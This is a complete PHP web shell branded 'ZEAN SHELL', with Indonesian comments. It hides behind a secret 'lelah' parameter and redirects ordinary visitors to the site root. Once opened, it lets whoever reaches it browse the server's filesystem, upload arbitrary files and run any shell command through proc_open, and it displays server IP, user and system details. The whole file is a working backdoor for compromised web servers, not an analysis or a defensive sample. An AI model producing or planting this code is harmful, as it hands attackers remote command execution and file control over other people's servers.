<?php
// Cek parameter "lelah"
if (!isset($_GET['lelah']) && !isset($_POST['lelah'])) {
    header("Location: /");
    exit;
}

error_reporting(0);
set_time_limit(0);

$initial_path = realpath(getcwd());

$path = null;
if (isset($_GET['path'])) {
    $path = realpath($_GET['path']);
} elseif (isset($_POST['path'])) {
    $path = realpath($_POST['path']);
}
if (!$path || !is_dir($path)) {
    $path = $initial_path;
}

function getUserGroup($file) {
    $uid = fileowner($file);
    $gid = filegroup($file);
    $user = function_exists('posix_getpwuid') ? @posix_getpwuid($uid)['name'] ?? $uid : $uid;
    $group = function_exists('posix_getgrgid') ? @posix_getgrgid($gid)['name'] ?? $gid : $gid;
    return [$user, $group];
}

function build_url($params = []) {
    $params['lelah'] = '';
    return '?' . http_build_query($params);
}

// Handle file upload dengan pengecekan error
$upload_error_msg = '';
if (isset($_FILES['upload'])) {
    if ($_FILES['upload']['error'] === UPLOAD_ERR_OK) {
        $dest = $path . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
        if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
            // Sukses upload
        } else {
            $upload_error_msg = "Gagal memindahkan file upload.";
        }
    } else {
        $upload_error_msg = "Error upload file: " . $_FILES['upload']['error'];
    }
    if ($upload_error_msg !== '') {
        header("Location: " . build_url(['path' => $path, 'upload_error' => urlencode($upload_error_msg)]));
        exit;
    } else {
        header("Location: " . build_url(['path' => $path]));
        exit;
    }
}

$output = '';
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    chdir($path);

    $descriptors = [
      0 => ['pipe', 'r'], // stdin
      1 => ['pipe', 'w'], // stdout
      2 => ['pipe', 'w'], // stderr
    ];

    $process = proc_open($cmd, $descriptors, $pipes);

    if (is_resource($process)) {
        fclose($pipes[0]);

        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);

        $error = stream_get_contents($pipes[2]);
        fclose($pipes[2]);

        proc_close($process);

        if ($error) {
            $output .= "\nError:\n" . $error;
        }
    } else {
        $output = "Failed to execute command.";
    }
}

$server_ip = gethostbyname(gethostname());
$remote_ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$server_name = $_SERVER['SERVER_NAME'] ?? 'Unknown';
$user = get_current_user();
$uname = php_uname();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>🌐 ZEAN SHELL (proc_open)</title>
<style>
    body { background: #1e1e2f; color: #cfd2dc; font-family: monospace; margin:0; padding: 20px; }
    a { color: #61dafb; text-decoration: none; }
    a:hover { text-decoration: underline; }
    #file-list { background: #2c2f4a; padding: 10px; border-radius: 8px; max-height: 600px; overflow: auto; }
    pre { background: #111; color: #0f0; padding: 10px; border-radius: 5px; max-height: 300px; overflow: auto; font-family: monospace; }
    .flex-row { display: flex; padding: 4px 0; border-bottom: 1px solid #333; align-items: center; font-size: 14px; }
    .col-name { min-width: 40%; overflow-wrap: break-word; }
    .col-size { min-width: 12%; text-align: right; }
    .col-user, .col-group, .col-perm { min-width: 10%; text-align: center; }
    .col-time { min-width: 20%; }
    .error-msg { color: #e74c3c; margin-bottom: 10px; font-weight: bold; }
</style>
</head>
<body>
<h1>🌐 ZEAN SHELL (proc_open)</h1>

<div>
    <b>Server Info:</b> <?= htmlspecialchars($server_ip) ?> |
    Client IP: <?= htmlspecialchars($remote_ip) ?> |
    Domain: <?= htmlspecialchars($server_name) ?> |
    User: <?= htmlspecialchars($user) ?> |
    Uname: <?= htmlspecialchars($uname) ?>
</div>

<div style="margin-top:10px; margin-bottom:10px;">
    <a href="<?= build_url(['path' => $initial_path]) ?>">🔙 Back to Root</a>
</div>

<?php if (isset($_GET['upload_error'])): ?>
    <div class="error-msg"><?= htmlspecialchars(urldecode($_GET['upload_error'])) ?></div>
<?php endif; ?>

<div id="file-list">
<?php
echo "<div class='flex-row' style='font-weight:bold;'>
    <div class='col-name'>Name</div>
    <div class='col-size'>Size</div>
    <div class='col-user'>User</div>
    <div class='col-group'>Group</div>
    <div class='col-perm'>Perm</div>
    <div class='col-time'>Modified</div>
</div>";

$files = scandir($path);
$folders = [];
$files_only = [];

foreach ($files as $file) {
    if ($file === '.') continue;
    $full = $path . DIRECTORY_SEPARATOR . $file;
    if (is_dir($full)) {
        $folders[] = $file;
    } else {
        $files_only[] = $file;
    }
}

sort($folders, SORT_NATURAL | SORT_FLAG_CASE);
sort($files_only, SORT_NATURAL | SORT_FLAG_CASE);
$all = array_merge($folders, $files_only);

foreach ($all as $file) {
    $full = $path . DIRECTORY_SEPARATOR . $file;
    $isDir = is_dir($full);
    $size = $isDir ? '-' : number_format(filesize($full)) . ' B';
    $perm = substr(sprintf('%o', fileperms($full)), -4);
    $time = date("Y-m-d H:i:s", filemtime($full));
    list($userf, $group) = getUserGroup($full);

    $link = $isDir
        ? "<a href='" . build_url(['path' => $full]) . "'>📁 " . htmlspecialchars($file) . "</a>"
        : "<a href='" . build_url(['path' => $path, 'view' => $file]) . "'>📄 " . htmlspecialchars($file) . "</a>";

    echo "<div class='flex-row'>
        <div class='col-name'>$link</div>
        <div class='col-size' style='text-align:right;'>$size</div>
        <div class='col-user' style='text-align:center;'>$userf</div>
        <div class='col-group' style='text-align:center;'>$group</div>
        <div class='col-perm' style='text-align:center;'>$perm</div>
        <div class='col-time'>$time</div>
    </div>";
}
?>
</div>

<div style="margin-top: 20px;">
    <h3>Upload File</h3>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="upload" style="width:100%;">
        <input type="hidden" name="lelah" value="">
        <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
        <input type="submit" value="Upload" style="width:100%; margin-top:5px;">
    </form>
</div>

<div style="margin-top: 20px;">
    <h3>Terminal</h3>
    <form method="POST">
        <input type="text" name="cmd" placeholder="Masukkan perintah shell" style="width:100%;" autocomplete="off">
        <input type="hidden" name="lelah" value="">
        <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
        <input type="submit" value="Jalankan" style="width:100%; margin-top:5px;">
    </form>
    <pre><?= htmlspecialchars($output) ?></pre>
</div>

</body>
</html>

